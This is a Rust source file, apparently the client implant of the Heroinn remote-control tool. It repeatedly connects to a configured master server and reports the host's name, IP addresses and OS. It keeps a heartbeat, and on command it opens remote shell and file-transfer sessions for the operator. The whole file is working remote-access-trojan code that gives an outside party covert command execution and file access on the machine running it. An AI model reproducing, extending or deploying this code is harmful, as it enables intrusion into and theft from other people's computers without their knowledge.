use std::{sync::{mpsc::channel, Arc, atomic::AtomicU64, Mutex}, time::Duration, str::FromStr};
use std::sync::atomic::Ordering::Relaxed;
use uuid::Uuid;
use heroinn_util::{protocol::{ClientWrapper}, packet::{Message, HostInfo, Heartbeat}, HeroinnClientMsgID, cur_timestamp_secs, HEART_BEAT_TIME, HeroinnServerCommandID, session::{SessionBase, Session, SessionManager}, HeroinnProtocol, close_all_session_in_lock, SlaveDNA, gen::CONNECTION_INFO_FLAG};
use systemstat::{Platform , System, Ipv4Addr};
use lazy_static::*;

mod module;
mod config;

use module::Shell::ShellClient;

use crate::{module::ftp::FtpClient, config::master_configure};

const G_CONNECTION_INFO : SlaveDNA = SlaveDNA{ flag : CONNECTION_INFO_FLAG, size : [0u8;8], data : [0u8;1024] };

lazy_static!{
    static ref G_OUT_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
    static ref G_IN_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
}

fn main() {

    simple_logger::SimpleLogger::new().with_threads(true).with_utc_timestamps().with_colors(true).init().unwrap();
	::log::set_max_level(log::LevelFilter::Debug);

    let clientid = Uuid::new_v4().to_string();

    let shell_session_mgr : SessionManager<ShellClient> = SessionManager::new();
    let shell_session_mgr = Arc::new(Mutex::new(shell_session_mgr));

    let ftp_session_mgr : SessionManager<FtpClient> = SessionManager::new();
    let ftp_session_mgr = Arc::new(Mutex::new(ftp_session_mgr));
    
    let shell_session_mgr_1 = shell_session_mgr.clone();
    let ftp_session_mgr_1 = ftp_session_mgr.clone();
    std::thread::spawn(move || {
        loop{
            std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
            let mut shell_session = shell_session_mgr_1.lock().unwrap();
            let mut ftp_session = ftp_session_mgr_1.lock().unwrap();

            log::info!("shell session : {}" , shell_session.count());
            log::info!("ftp session : {}" , ftp_session.count());

            shell_session.gc();
            ftp_session.gc();
        }
    });

    let config = master_configure();

    loop{
        close_all_session_in_lock!(shell_session_mgr);

        let (session_sender , session_receiver) = channel::<SessionBase>();

        let mut client : ClientWrapper = match ClientWrapper::connect(&HeroinnProtocol::from(config.protocol) , &config.address){
            Ok(p) => p,
            Err(e) => {
                log::info!("connect faild : {}" , e);
                std::thread::sleep(Duration::from_secs(5));
                continue;
            },
        };

        log::info!("connect success!");
        
        let hostname = match hostname::get(){
            Ok(p) => p.to_str().unwrap().to_string(),
            Err(_) => "UNKNOW".to_string(),
        };

        let sys = System::new();
        let ips = match sys.networks() {
            Ok(netifs) => {
                let mut ret = String::new();
                for netif in netifs.values() {
                    for i in &netif.addrs{
                        match i.addr{
                            systemstat::IpAddr::V4(p) => {
                                if p == Ipv4Addr::from_str("127.0.0.1").unwrap() {
                                    continue;
                                }
                                ret += &format!("{},", p);
                            },
                            _ => {},
                        }
                    }
                }
                ret
            }
            Err(_) => "UNKNOW".to_string()
        };

        let info = os_info::get();
        let os = format!("{} {} {}", info.os_type() , info.bitness() , info.version());

        let hostinfo = HostInfo{
            ip: ips,
            host_name: hostname,
            os: os,
            remark: "test remark".to_string()
        };

        let mut buf = match Message::build(HeroinnClientMsgID::HostInfo.to_u8(), &clientid, hostinfo){
            Ok(p) => p,
            Err(e) => {
                log::error!("make HostInfo packet faild : {}" ,e);
                client.close();
                continue;
            },
        };

        match client.send(&mut buf){
            Ok(p) => p,
            Err(e) => {
                log::error!("send HostInfo packet faild : {}" ,e);
                client.close();
                continue;
            },
        };

        let (sender , receriver) = channel::<Vec<u8>>();

        let mut client_1 = client.clone();
        std::thread::spawn(move || {
            loop{
                let mut buf = match receriver.recv(){
                    Ok(p) => p,
                    Err(e) => {
                        log::info!("sender channel closed : {}" , e);
                        break;
                    },
                };

                G_OUT_BYTES.fetch_add(buf.len() as u64, Relaxed);

                match client_1.send(&mut buf){
                    Ok(p) => p,
                    Err(e) => {
                        log::info!("sender channel closed : {}" , e);
                        client_1.close();
                        break;
                    },
                };
                log::info!("id : {} send [{}] bytes", buf[0] , buf.len());
            }
            
        });

        let mut client_2 = client.clone();
        let clientid_1 = clientid.clone();
        let sender_1 = sender.clone();
        std::thread::spawn(move || {
            loop{

                //flush in & out transfer rate
                let in_rate = G_IN_BYTES.load(Relaxed);
                let out_rate = G_OUT_BYTES.load(Relaxed);

                G_IN_BYTES.store(0, Relaxed);
                G_OUT_BYTES.store(0, Relaxed);

                let heartbeat = Heartbeat{
                    time: cur_timestamp_secs(),
                    in_rate,
                    out_rate,
                };
                log::info!("inrate : {} , outrate : {}" , in_rate , out_rate);
                let buf = match Message::build(HeroinnClientMsgID::Heartbeat.to_u8(), &clientid_1, heartbeat){
                    Ok(p) => p,
                    Err(e) => {
                        log::error!("make Heartbeat packet faild : {}" ,e);
                        break;
                    },
                };

                match sender_1.send(buf){
                    Ok(p) => p,
                    Err(e) => {
                        log::error!("send Heartbeat packet to channel faild : {}" ,e);
                        break;
                    },
                };

                std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
            }
            client_2.close();
        });

        std::thread::spawn(move || {
            loop{
                let base = match session_receiver.recv(){
                    Ok(p) => p,
                    Err(e) => {
                        log::info!("session receiver channel closed : {}" , e);
                        break;
                    },
                };

                let buf = Message::build(HeroinnClientMsgID::SessionPacket.to_u8(), &base.clientid , base.packet).unwrap();

                match sender.send(buf){
                    Ok(p) => p,
                    Err(e) => {
                        log::info!("session receiver closed : {}" , e);
                        break;
                    },
                };
            }
        });

        loop{

            match client.recv(){
                Ok(buf) => {
                    G_IN_BYTES.fetch_add(buf.len() as u64, Relaxed);
                    log::info!("recv [{}] bytes" , buf.len());

                    match HeroinnServerCommandID::from(buf[0]){
                        HeroinnServerCommandID::Shell => {
                            let msg = Message::new(client.local_addr().unwrap() , HeroinnProtocol::TCP , &buf).unwrap();
                            let session = ShellClient::new_client(session_sender.clone(), &clientid , &msg.parser_sessionpacket().unwrap().id).unwrap();
                            shell_session_mgr.lock().unwrap().register(session);
                        },
                        HeroinnServerCommandID::File => {
                            let msg = Message::new(client.local_addr().unwrap() , HeroinnProtocol::TCP , &buf).unwrap();
                            let session = FtpClient::new_client(session_sender.clone(), &clientid , &msg.parser_sessionpacket().unwrap().id).unwrap();
                            ftp_session_mgr.lock().unwrap().register(session);
                        },
                        HeroinnServerCommandID::SessionPacket => {
                            let msg = Message::new(client.local_addr().unwrap() , HeroinnProtocol::TCP , &buf).unwrap();
                            let packet = msg.parser_sessionpacket().unwrap();

                            log::info!("recv session packet [{}] [{}]" , packet.id , msg.length());

                            shell_session_mgr.lock().unwrap().write(&packet.id, &packet.data).unwrap();
                            ftp_session_mgr.lock().unwrap().write(&packet.id, &packet.data).unwrap();
                        },
                        HeroinnServerCommandID::Unknow => {
                            
                        },
                    }
                },
                Err(e) => {
                    log::error!("connection recv faild : {}" ,e);
                    client.close();
                    break;
                },
            }
        }
    }
}
